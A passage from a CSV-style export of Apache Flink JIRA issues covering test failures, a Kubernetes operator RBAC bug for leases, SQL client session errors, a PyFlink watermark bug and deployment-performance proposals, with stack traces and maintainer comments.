* The first one is ChannelStateWriteRequestExecutorImpl#lock, and update the isRegistering from true to false.
* The second one is onRegistered.accept(this) will hold ChannelStateWriteRequestExecutorFactory#lock and update the ChannelStateWriteRequestExecutorFactory#executor

However, these 2 locks are held at the different time. The following calls will meet a bug:

* Subtask 1 finished the first step of releaseSubtask, and doesn't hold the second lock.
* Subtask 2 is starting, and call the executor#registerSubtask

Subtask2 will throw *_This executor has been registered_*.

This bug can be reproduced by the unit test. I have added a unit test with multiple threads to trigger this bug. After the [PR|https://github.com/apache/flink/pull/22983], the test is fine.

h1. Question

Case2 and case3 are thread-unsafe and bug, however, I didn't see they happen from CI log. I uploaded the log with this exception : `java.lang.IllegalStateException: This executor has been registered.` The detailed log in mvn-3.log.
 ;;;","13/Jul/23 07:43;fanrui;Merged via:
<master: 1.18> bc4c21e47040360aab5bcb0f2c18b907b60e7838
1.17 : c8b6c79ee57050cea8be81f56b707ccbcc0fdf4d;;;","13/Jul/23 11:03;fanrui;Hi [~Sergey Nuyanzin][~renqs], thanks for the reporting.

We have fixed the bug. In theory, this exception cannot happen again. I close this JIRA first, please cc me if it happens again.;;;",,,,,,,,,,,,,,,,,,
"DecimalITCase.testAggMinGroupBy fails with ""Insufficient number of network buffers""",FLINK-32048,13535652,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,tanyuxin,wanglijie,wanglijie,10/May/23 14:22,11/May/23 11:57,04/Jun/24 20:41,11/May/23 11:57,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Network,Table SQL / Planner,Tests,,0,pull-request-available,test-stability,,"[https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=48855&view=logs&j=0c940707-2659-5648-cbe6-a1ad63045f0a&t=075c2716-8010-5565-fe08-3c4bb45824a4]
{code:java}
May 10 09:37:41 Caused by: java.io.IOException: Insufficient number of network buffers: required 1, but only 0 available. The total number of network buffers is currently set to 2048 of 32768 bytes each. You can increase this number by setting the configuration keys 'taskmanager.memory.network.fraction', 'taskmanager.memory.network.min', and 'taskmanager.memory.network.max'.
May 10 09:37:41 	at org.apache.flink.runtime.io.network.buffer.NetworkBufferPool.internalCreateBufferPool(NetworkBufferPool.java:495)
May 10 09:37:41 	at org.apache.flink.runtime.io.network.buffer.NetworkBufferPool.createBufferPool(NetworkBufferPool.java:456)
May 10 09:37:41 	at org.apache.flink.runtime.io.network.partition.consumer.SingleInputGateFactory.lambda$createBufferPoolFactory$3(SingleInputGateFactory.java:330)
May 10 09:37:41 	at org.apache.flink.runtime.io.network.partition.consumer.SingleInputGate.setup(SingleInputGate.java:274)
May 10 09:37:41 	at org.apache.flink.runtime.taskmanager.InputGateWithMetrics.setup(InputGateWithMetrics.java:105)
May 10 09:37:41 	at org.apache.flink.runtime.taskmanager.Task.setupPartitionsAndGates(Task.java:969)
May 10 09:37:41 	at org.apache.flink.runtime.taskmanager.Task.doRun(Task.java:654)
May 10 09:37:41 	at org.apache.flink.runtime.taskmanager.Task.run(Task.java:562)
May 10 09:37:41 	at java.lang.Thread.run(Thread.java:748)
{code}",,,,,,,,,,,,,,,,,,,,,FLINK-30815,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu May 11 11:57:07 UTC 2023,,,,,,,,,,"0|z1hsxk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/May/23 15:25;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=48874&view=logs&j=0c940707-2659-5648-cbe6-a1ad63045f0a&t=075c2716-8010-5565-fe08-3c4bb45824a4&l=12367;;;","10/May/23 18:22;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=48863&view=logs&j=0c940707-2659-5648-cbe6-a1ad63045f0a&t=075c2716-8010-5565-fe08-3c4bb45824a4&l=12370;;;","10/May/23 18:24;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=48844&view=logs&j=0c940707-2659-5648-cbe6-a1ad63045f0a&t=075c2716-8010-5565-fe08-3c4bb45824a4&l=12658;;;","10/May/23 20:22;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=48885&view=logs&j=0c940707-2659-5648-cbe6-a1ad63045f0a&t=075c2716-8010-5565-fe08-3c4bb45824a4&l=12654;;;","11/May/23 07:02;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=48890&view=logs&j=0c940707-2659-5648-cbe6-a1ad63045f0a&t=075c2716-8010-5565-fe08-3c4bb45824a4&l=12654;;;","11/May/23 07:31;Weijie Guo;This maybe caused by FLINK-30815, [~tanyuxin] would you mind taking a look at this?;;;","11/May/23 07:49;tanyuxin;I will take a look. The reason may be that the parent class is migrated to JUnit5 in https://issues.apache.org/jira/browse/FLINK-30815, the subclasses can not be set to DEFAULT_PARALLELISM=3 in BatchAbstractTestBase, because the subclass DecimalITCase is not JUnit5.
I will first update this class to JUnit5 to resolve the issue. And I created a follow-up jira https://issues.apache.org/jira/browse/FLINK-32055 to resolve this.;;;","11/May/23 08:28;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=48895&view=logs&j=0c940707-2659-5648-cbe6-a1ad63045f0a&t=075c2716-8010-5565-fe08-3c4bb45824a4&l=12869;;;","11/May/23 08:29;Sergey Nuyanzin;Thanks for having a look [~tanyuxin];;;","11/May/23 11:57;Weijie Guo;master(1.18) via 8ef5cc8c3f85b26e713b9a37c02ac54475f493d8.;;;",,,,,,,,,,,,,
Fix args in JobSpec not being passed through to Flink in Standalone mode - 1.4.0,FLINK-32047,13535642,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Cannot Reproduce,,gil_shmaya,gil_shmaya,10/May/23 13:20,31/Aug/23 07:01,04/Jun/24 20:41,31/Aug/23 07:01,,,,,,,,,,,,,,,1.14.0,,,,,,Kubernetes Operator,,,,0,,,,"This issue is related to a previously fixed bug in version 1.2.0 -  FLINK-29388

I have noticed that while the args are successfully being passed when using version 1.2.0, this is not the case with version 1.4.0.

{+}Scenario{+}:

I added a log that prints the argument array length at the beginning of the main  function of the flink job:
!image-2023-04-30-18-54-22-291.png!

The result when running with 1.2.0:
!image-2023-04-30-19-56-30-150.png!

The result when running with 1.4.0:
!image-2023-04-30-19-56-57-680.png!
h4.  ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/May/23 13:23;gil_shmaya;image-2023-04-30-18-54-22-291.png;https://issues.apache.org/jira/secure/attachment/13057965/image-2023-04-30-18-54-22-291.png","10/May/23 13:23;gil_shmaya;image-2023-04-30-19-56-30-150.png;https://issues.apache.org/jira/secure/attachment/13057966/image-2023-04-30-19-56-30-150.png","10/May/23 13:23;gil_shmaya;image-2023-04-30-19-56-57-680.png;https://issues.apache.org/jira/secure/attachment/13057967/image-2023-04-30-19-56-57-680.png",,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,Important,,,,,,,,9223372036854775807,,,,Wed May 24 10:08:18 UTC 2023,,,,,,,,,,"0|z1hsvc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/May/23 13:24;gyfora;Does this still affect the current main branch? Could you please check?;;;","11/May/23 13:23;gil_shmaya;[~gyfora] 
Yes, the results are the same: 

*!image-2023-05-11-16-21-24-547.png!*

Have you done a change that should resolve that?

This bug blocks us for a long time.;;;","11/May/23 13:47;gyfora;If you have time and can work on this, I would be happy to to assign this to you.[~gil_shmaya] ;;;","11/May/23 13:50;gyfora;cc[~darenwkt] [~usamj] have you encountered this?;;;","11/May/23 15:35;usamj;I can look into it;;;","12/May/23 14:47;usamj;Hey  Gil, have you got an example FlinkDeployment to recreate the issue? Which version of Flink do you see the issue with?;;;","14/May/23 10:03;gil_shmaya;Hi [~usamj],
We use 1.14.0 Flink version and 1.4.0 Flink k8s operator version in {*}standalone mode{*}.

Every FlinkDeployment in these versions that contains the ""args"" parameter suppose to recreate the bug.;;;","15/May/23 10:42;usamj;Can you upgrade your Flink version to 1.14.3 and see if that works?

 

Using this example FlinkDeployment:

 

apiVersion: flink.apache.org/v1beta1
kind: FlinkDeployment
metadata:
  namespace: default
  name: basic-application-example-standalone
spec:
  image: flink:1.14.3
  flinkVersion: v1_14
  serviceAccount: default
  jobManager:
    replicas: 1
    resource:
      memory: ""1024m""
      cpu: 1
  taskManager:
    resource:
      memory: ""1024m""
      cpu: 1
    replicas: 1
  job:
    jarURI: local:///opt/flink/examples/streaming/StateMachineExample.jar
    parallelism: 2
    args: 
      - test-arg
      - arg
  mode: standalone

 

I get this error:

Caused by: java.lang.IllegalArgumentException: Error parsing arguments '[test-arg, arg]' on 'test-arg'. Please prefix keys with – or -.

 

Indicating that the args are getting passed through.;;;","15/May/23 13:52;gil_shmaya;[~usamj] We run with 1.14.6, sorry for the confusion.
I see the same error while trying to run your test with 1.14.6.

However, I can't find an explanation for the fact we see the args pass in the version 1.2.0 operator version but not with 1.4.0. Is it possible that there was a change in the way we should configure the args in 1.4.0?;;;","21/May/23 07:03;gil_shmaya;[~gyfora] [~usamj] ;;;","24/May/23 10:08;gyfora;[~gil_shmaya] , I am not aware of any major change there. Would be best to try to step debug the operator locally and see what goes wrong for you. ;;;",,,,,,,,,,,,
OOM caused by SplitAssignmentTracker.uncheckpointedAssignments,FLINK-32046,13535624,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,pvary,pvary,10/May/23 10:58,10/May/23 11:42,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Connectors / Common,,,,0,,,,"If the checkpointing is turned off then the {{SplitAssignmentTracker.uncheckpointedAssignments}} is never cleared and grows indefinitely. Eventually leading to OOM.

The only other place which would remove elements from this map is {{{}getAndRemoveUncheckpointedAssignment{}}}, but it is only for failure scenarios.

By my understanding this problem exists since the introduction of the new {{Source}} implementation.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-10 10:58:39.0,,,,,,,,,,"0|z1hsrc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
optimize task deployment performance for large-scale jobs,FLINK-32045,13535621,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,huwh,huwh,huwh,10/May/23 10:34,23/Jul/23 08:37,04/Jun/24 20:41,23/Jul/23 08:37,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,,,,"h1. Background

In FLINK-21110, we cache shuffle descriptors on the job manager side and support using blob servers to offload these descriptors in order to reduce the cost of tasks deployment.

I think there is also some improvement we could do for large-scale jobs.
 # The default min size to enable distribution via blob server is 1MB. But for a large wordcount job with 20000 parallelism, the size of serialized shuffle descriptors is only 300KB. It means users need to lower the ""blob.offload.minsize"", but the value is hard for users to decide.
 # The task executor side still needs to load blob files and deserialize shuffle descriptors for each task. Since these operations are running in the main thread, it may be pending other RPCs from the job manager.

h1. Propose
 # Enable distribute shuffle descriptors via blob server automatically. This could be decided by the edge number of the current shuffle descriptor. The blob offload will be enabled when the edge number exceeds an internal threshold.
 # Introduce cache of deserialized shuffle descriptors on the task executor side. This could reduce the cost of reading from local blob files and deserialization. Of course, the cache should have TTL to avoid occupying too much memory. And the cache should have the same switch mechanism as the blob server offload.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu May 11 13:31:12 UTC 2023,,,,,,,,,,"0|z1hsqo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"11/May/23 05:15;Thesharing;Thank you for proposing these optimizations, Weihua!

??1. Add a configuration to enable the distribution of shuffle descriptors via the blob server according to the parallelism.??

For the threshold to enable the distribution of shuffle descriptors via the blob server, originally I'm thinking about adding a new configuration called something like ""blob.deployement.offload.minsize"" (I forgot the original name). This configuration was eventually dropped, because we don't want to introduce a new configuration that would require users to have advanced knowledge before configuring it.

However, I think enabling the distribution of shuffle descriptors via the blob server according to the parallelism is a better solution for this situation. It's more understandable and easier to configure. We can also set a large default value for this configuration. What do you think [~zhuzh]?

??2. Introduce a cache for shuffle descriptors in the TaskManager??

We thought about introducing a cache for shuffle descriptors in the TaskManager earlier. Since users usually won't set a large number for the configuration ""taskmanager.numberOfTaskSlots"", which means there would only be a few slots in a TaskManager (for example, 8?). There won't be a lot of deserialization work on the TaskManager side. So, I'm wondering how much performance it would improve with a cache for shuffle descriptors in the TaskManager.

Also, there's another question arises for the cache. How to update the cache?  Currently, the cache in JobManager is cleared in two scenarios: (1) ConsumerPartitionGroup is released (2) The producer of an IntermediateResult encounters a failover. To clear the caches in the TaskManager at the same time, we may need to introduce a few complicated RPC calls between JobManager and TaskManager to achieve it. In my opinion, it's a bit of complicated.

The third concern is about the session mode. If users submitted a lot of jobs to a session in a rapid speed, the cache would flush the heap memory in a short time, and causes unexpected influence for user's tasks. We can use a LRUCache or FIFOCache for this situation. However, it's not easy for us to decide the size of the cache, because we don't know how large the TaskManager would be.

In my opinion, introducing a cache for ShuffleDescriptors in the TaskManager may require more discussions. Please correct me if I missed anything or anything I said is wrong. Thank you.;;;","11/May/23 13:31;huwh;Thanks [~Thesharing]  for your reply, your comment are very meaningful and valuable. Let me try to answer one by one.
h3. Distribution of shuffle descriptors via blob server.
IMO, there are two things should considered to whether enable distribution of shuffle descriptors via blob server.
 # 
The size of shuffle descriptors. This is related to the parallelism of producers for a single consumer.
 # 
How many times should this shuffle descriptors transport to TaskManager. This is related to the parallelism of consumers for this producer.

  So, I think it is better to use the number of edges in ConsumedPartitionGroup to decide whether to enable blob server offload.
  And I'd like to make this logic internally (give a proper default value, for example 1000*1000, should be decided after some benchmark) since it really needs advanced knowledge for users to figure it out how to set it.
h3. how much performance it would improve with a cache for shuffle descriptors in the TaskManager.
 I have tests in this environment. Yarn cluster with 2000 TaskManager. Each TaskManager has 6 core and 16GB memory and set ""taskmanager.numberOfTaskSlots"" to 10. Submit a simple WordCount with 20000 parallelism. * Without blob server offload, the job failed with submitTask RPC timeout. All CPU of JobManager used to serialized RPC:submitTask.
 * With blob server offload but no TaskExecutor cache, deploy all tasks take 25s
 * With blob server offload and TaskExecutor cache, deploy all tasks take 15s

h3. How to update the cache?
As you mentioned, it's too complicated to keep cache in JobManager and TaskExecutor consistent. So, we will add some constraints to the Cache
 # 
Cache will be enabled when necessary (same conditions with distribution of shuffle descriptors via blob server). In most cases serialized shuffle descriptors are small and transport in akka message, the cost of deserialization is very small, they do not need to be cached.
 # 
Cache of job will be cleared when task executor disconnects with job master.
 # 
Cache with TTL. We should configure a proper default ttl value, for example 3 mins (some batch job may deploy lazily)
 # 
The max size of cache. As you mentioned, LRUCache or FIFOCache is reasonable. Since the slots of a Task Manager won't be too large, the cache size won't be too large either.

For session mode(more exactly OLAP). IMO, Most of the scenarios are a lot of small queries. As mentioned above, they won't use cache in most cases. And the cache will be removed when the job is finished( task executor disconnects with job master), so the cache won't occupy too much memory in a short time.
 
 
Thanks again. Also thanks to [~zhuzh] ,[~wanglijie] , [~Weijie Guo] for the previous offline discussions.
Glad to hear any suggestions.;;;",,,,,,,,,,,,,,,,,,,,,
Improve catalog name check to keep consistent about human-readable exception log in FunctionCatalog ,FLINK-32044,13535618,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,taoran,taoran,10/May/23 10:14,10/Sep/23 22:35,04/Jun/24 20:41,,1.17.0,,,,,,,,,,,,,,,,,,,,Table SQL / API,,,,0,auto-deprioritized-major,pull-request-available,,"{code:java}
Catalog catalog = catalogManager.getCatalog(catalogName).get(); {code}
 

We can do an improvement to check optional#get and throw more friendly log to users like other list operations.  ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Sep 10 22:35:05 UTC 2023,,,,,,,,,,"0|z1hsq0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"02/Sep/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","10/Sep/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;",,,,,,,,,,,,,,,,,,,,,
SqlClient session unrecoverable once one wrong setting occurred,FLINK-32043,13535608,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,fsk119,lincoln.86xy,lincoln.86xy,10/May/23 08:33,25/May/23 11:51,04/Jun/24 20:41,25/May/23 11:51,1.17.0,1.18.0,,,,,,,,,,,,,,,,,,,Table SQL / Client,,,,0,,,,"In sql client, it can not work normally once one wrong setting occurred
{code:java}
// wrong setting here

Flink SQL> SET table.sql-dialect = flink;
[INFO] Execute statement succeed.

Flink SQL> select '' AS f1, a from t1;
[ERROR] Could not execute SQL statement. Reason:
java.lang.IllegalArgumentException: No enum constant org.apache.flink.table.api.SqlDialect.FLINK

Flink SQL> SET table.sql-dialect = default;
[ERROR] Could not execute SQL statement. Reason:
java.lang.IllegalArgumentException: No enum constant org.apache.flink.table.api.SqlDialect.FLINK

Flink SQL> RESET table.sql-dialect;
[ERROR] Could not execute SQL statement. Reason:
java.lang.IllegalArgumentException: No enum constant org.apache.flink.table.api.SqlDialect.FLINK

Flink SQL> RESET;
[ERROR] Could not execute SQL statement. Reason:
java.lang.IllegalArgumentException: No enum constant org.apache.flink.table.api.SqlDialect.FLINK 
{code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu May 25 02:22:10 UTC 2023,,,,,,,,,,"0|z1hsns:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"25/May/23 02:22;fsk119;Merged into release-1.17: 23030f6546a5f5877166ee1dc6f49dd18f4dc188

Merged into master: 1ef847b2c5244de0ba351dff3f21701acb8f3cce;;;",,,,,,,,,,,,,,,,,,,,,,
Support calculate versions of all tables for job in planner,FLINK-32042,13535579,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,zjureel,zjureel,10/May/23 03:19,10/May/23 04:02,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Table SQL / Planner,,,,0,,,,"Set customized callback in planner for scan sources, for example, calculate snapshot id for different sources in the same job for data lake",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-10 03:19:50.0,,,,,,,,,,"0|z1hshc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
flink-kubernetes-operator RoleBinding for Leases not created in correct namespace when using watchNamespaces,FLINK-32041,13535530,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,tchin,ottomata,ottomata,09/May/23 14:27,02/Jun/23 12:16,04/Jun/24 20:41,01/Jun/23 11:14,kubernetes-operator-1.4.0,,,,,,,,,,,,,,kubernetes-operator-1.6.0,,,,,,Kubernetes Operator,,,,0,pull-request-available,,,"When enabling [HA for flink-kubernetes-operator|https://nightlies.apache.org/flink/flink-kubernetes-operator-docs-main/docs/operations/configuration/#leader-election-and-high-availability] RBAC rules must be created to allow the flink-operator to manage k8s Lease resources.  When not using {{{}watchNamespaces{}}}, the RBAC rules are created at the k8s cluster level scope, giving the flink-operator ServiceAccount the ability to manage all needed k8s resources for all namespaces.

However, when using {{{}watchNamespaces{}}}, RBAC rules are only created in the {{{}watchNamepaces{}}}.  For most rules, this is correct, as the operator needs to manage resources like Flink pods and deployments in the {{{}watchNamespaces{}}}.  

However, For flink-kubernetes-operator HA, the Lease resource is managed in the same namespace in which the operator is deployed.  

The Helm chart should be fixed so that the proper RBAC rules for Leases are created to allow the operator's ServiceAccount in the operator's namespace.

Mailing list discussion [here.|https://lists.apache.org/thread/yq89jm0szkcodfocm5x7vqnqdmh0h1l0]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 01 11:14:51 UTC 2023,,,,,,,,,,"0|z1hs6g:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"09/May/23 15:10;gyfora;A current workaround for this would be to add the operator's own namespace to the list of watched namespaces. That would set up the roles correctly in that namespace as well :) ;;;","10/May/23 05:42;tamirsagi;Hey Gyula,

I also encountered something similar  (HA is enabled).

 
I checked the rolebinding between the service account `dev-0-flink-clusters:dev-0-xsight-flink-operator-sa` and the corresponded role({*}flink-operator{*}) which has been created by the operator using *{{rbac.nodesRule.create=true, they both look fine.}}*

 

The operator watches 2 namespaces:
 # its own:  dev-0-flink-clusters
 # dev-0-flink-temp-clusters

!https://lists.apache.org/api/email.lua?attachment=true&id=61qtwrnxlh722pvok8dtnzdt7t7k7drb&file=fe69ed8d14240d73b73f68176ee7fa4f13f2b0ee303676f8eea92b7bdee9ceb3!

!https://lists.apache.org/api/email.lua?attachment=true&id=61qtwrnxlh722pvok8dtnzdt7t7k7drb&file=c8a40ca61528174bd1667e3fcf10ba39e2224700198a69e828db80c66315719d!

{{Then the following error is thrown:}}

{{org.apache.flink.kubernetes.shaded.io.fabric8.kubernetes.client.KubernetesClientException"",""message"":""Failure executing: GET at: [https://172.20.0.1/api/v1/nodes]. Message: Forbidden!Configured service account doesn't have access. Service account may have been revoked. nodes is forbidden: User ""system:serviceaccount:dev-0-flink-clusters:{*}dev-0-xsight-flink-operator-sa{*}"" cannot list resource ""nodes"" in API group """" at the cluster scope.""}}

{{could it be related to : kubernetes.rest-service.exposed.type? }}

 

EDIT: seems like it resolved when changing {{kubernetes.rest-service.exposed.type from NodePort to ClusterIP.}};;;","14/May/23 16:24;gyfora;[~tamirsagi] does the same error occur without HA enabled?;;;","14/May/23 16:32;tamirsagi;I need to try and get back to you with an answer (probably tomorrow) . But it does seems connected to -k8s HA service &- RestClient & KubeClient. 
 
RestClient uses k8s client internally which needs NodeList permissions but instead of reading from Service account it looks for kube.config file.

[https://nightlies.apache.org/flink/flink-docs-master/docs/deployment/config/#kubernetes-config-file]

 
ClusterIP Service
[https://github.com/apache/flink/blob/release-1.17.0/flink-kubernetes/src/main/java/org/apache/flink/kubernetes/kubeclient/services/ClusterIPService.java#L44-L53]
 
NodePort Service
[https://github.com/apache/flink/blob/release-1.17.0/flink-kubernetes/src/main/java/org/apache/flink/kubernetes/kubeclient/services/NodePortService.java#L62];;;","14/May/23 16:35;gyfora;This may be completely unrelated to the original issue described in the ticket. That is about kubernetes operator HA, not Flink job HA.
Would be good to know whether this error occurs in operator 1.4.0 vs 1.5.0 and Flink version 1.16 vs 1.17;;;","14/May/23 17:11;tamirsagi;-I'm talking about Operator HA.-

-My point was when creating RestClusterClient, its constructor can take the ClientHighAvailabilityServicesFactory, if not provided it will look in classpath for implementation(based on cluster configurations). In my Flink configurations it is set to kubernetes. that's why I thought it might be related. (Noticed that in the operator it does pass the standalone HA service). so I might be wrong here.-

 

Edit: It has nothing to do with HA. rest expose-type should be ClusterIP and not NodePort.;;;","14/May/23 17:26;gyfora;Can you please share both the operator and FlinkDeployment configuration? I am a bit confused ;;;","18/May/23 17:43;ottomata;[~tchin] Is going to submit a PR for this, can you assign this to him?;;;","18/May/23 17:46;gyfora;done :) ;;;","22/May/23 13:29;tchin;Don't know how the GitHub bot works but a pull request has been opened [here|https://github.com/apache/flink-kubernetes-operator/pull/604];;;","01/Jun/23 11:14;gyfora;merged to main 6711bd93e1c8b1496c81117b6147ab6e163551fb;;;",,,,,,,,,,,,
The WatermarkStrategy defined with the Function(with_idleness) report an error,FLINK-32040,13535493,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,Joekwal,Joekwal,09/May/23 09:05,14/Jun/23 12:59,04/Jun/24 20:41,,1.16.0,1.17.0,,,,,,,,,,,,,,,,,,,API / Python,,,,0,,,,"*version:* upgrade pyflink1.15.2 to pyflink1.16.1

 

*Report an error:*

Record has Java Long.MIN_VALUE timestamp (= no timestamp marker). Is the time characteristic set to 'ProcessingTime', or did you forget to call 'data_stream.assign_timestamps_and_watermarks(...)'?

The application before with version 1.15.2 has never reported the error.

 

*Example:*
{code:java}
```python```

class MyTimestampAssigner(TimestampAssigner):    
   def extract_timestamp(self, value, record_timestamp: int) -> int:        
       return value['version']

sql=""""""
select columns,version(milliseconds) from kafka_source
""""""
table = st_env.sql_query(sql)
stream = st_env.to_changelog_stream(table)
stream = stream.assign_timestamps_and_watermarks(            WatermarkStrategy.for_bounded_out_of_orderness(Duration.of_minutes(1))            .with_timestamp_assigner(MyTimestampAssigner()).with_idleness(Duration.of_seconds(10)))

stream = stream.key_by(CommonKeySelector()) \
    .window(TumblingEventTimeWindows.of(Time.days(1), Time.hours(-8))) \
    .process(WindowFunction(), typeInfo){code}
 

Try to debug to trace  ??pyflink.datastream.data_stream.DataStream.assign_timestamps_and_watermarks?? and find ??watermark_strategy._timestamp_assigner?? is none.

*Solution:*
Remove the function ??with_idleness(Duration.of_seconds(10))??
{code:java}
stream = stream.assign_timestamps_and_watermarks(
    WatermarkStrategy.for_bounded_out_of_orderness(Duration.of_minutes(1))
    .with_timestamp_assigner(MyTimestampAssigner())) {code}
Is this a bug?",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jun 14 12:58:57 UTC 2023,,,,,,,,,,"0|z1hry8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/Jun/23 12:58;dianfu;Good catch! I think you are right that this is a bug. cc [~Juntao Hu] ;;;",,,,,,,,,,,,,,,,,,,,,,
ExecutorServiceResource and ExecutorServiceExtension's shutdown mechanism doesn't include a forced shutdown,FLINK-32039,13535469,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,mapohl,mapohl,09/May/23 06:34,11/May/23 09:04,04/Jun/24 20:41,,1.16.1,1.17.0,1.18.0,,,,,,,,,,,,,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,"{{ExecutorServiceResource}} and {{ExecutorServiceExtension}}'s shutdown mechanism doesn't include a forced shutdown. The shutdown is triggered but no verification happens whether the threads were actually shut down.

This issue adds a graceful shutdown to the resource/extension implementation (compare with [ExecutorUtils.gracefulShutdown|https://github.com/apache/flink/blob/c6997c97c575d334679915c328792b8a3067cfb5/flink-core/src/main/java/org/apache/flink/util/ExecutorUtils.java#L42]).",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-09 06:34:35.0,,,,,,,,,,"0|z1hrsw:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
OffsetCommitMode.Kafka_periodic with checkpointing enabled ,FLINK-32038,13535460,,Improvement,Reopened,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
